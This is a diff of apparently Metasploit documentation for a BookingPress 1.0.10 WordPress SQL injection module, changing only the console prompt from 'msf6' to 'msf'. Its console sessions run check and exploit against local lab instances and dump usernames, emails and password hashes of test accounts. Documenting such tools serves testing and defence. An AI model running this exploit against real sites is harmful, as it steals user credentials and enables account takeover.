@@ -131,12 +131,12 @@ this is worth a shot if you are having issues.
 ## Scenarios
 ### Booking Press 1.0.10, WordPress Running Via Docksal, Ubuntu 20.04
 ```
-msf6 > use gather/wp_bookingpress_category_services_sqli
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set rhosts localhost
+msf > use gather/wp_bookingpress_category_services_sqli
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > set rhosts localhost
 rhosts => localhost
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set rport 8000
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > set rport 8000
 rport => 8000
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > run
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > run
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target is vulnerable.
@@ -153,9 +153,9 @@ Wordpress User Credentials
  todd           todd@toddtown.com             $P$BnlpkVgxGFWnmvdDQ3JStgpIx8LMFj0
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set AutoCheck false
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > set AutoCheck false
 AutoCheck => false
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > run
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > run
 
 [!] AutoCheck is disabled, proceeding with exploitation
 [*] Extracting credential information
@@ -171,19 +171,19 @@ Wordpress User Credentials
  todd           todd@toddtown.com             $P$BnlpkVgxGFWnmvdDQ3JStgpIx8LMFj0
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) >
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) >
 ```
 
 ### Booking Press 1.0.10, WordPress Latest Docker Image on Debian 11 (bullseye)
 ```
-msf6 > use auxiliary/gather/wp_bookingpress_category_services_sqli
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set RHOSTS 127.0.0.1
+msf > use auxiliary/gather/wp_bookingpress_category_services_sqli
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set RPORT 8000
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > set RPORT 8000
 RPORT => 8000
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set TARGETURI "/?page_id=10"
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > set TARGETURI "/?page_id=10"
 TARGETURI => /?page_id=10
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > show options
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > show options
 
 Module options (auxiliary/gather/wp_bookingpress_category_services_sqli):
 
@@ -199,9 +199,9 @@ Module options (auxiliary/gather/wp_bookingpress_category_services_sqli):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > check
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > check
 [+] 127.0.0.1:8000 - The target is vulnerable.
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > exploit
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) > exploit
 [*] Running module against 127.0.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -216,5 +216,5 @@ Wordpress User Credentials
  testAdmin  test@testfakeness.com  $P$BYWtZOfh8yqLCKA877hwBysqGdRtk/.
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) >
+msf auxiliary(gather/wp_bookingpress_category_services_sqli) >
 ```
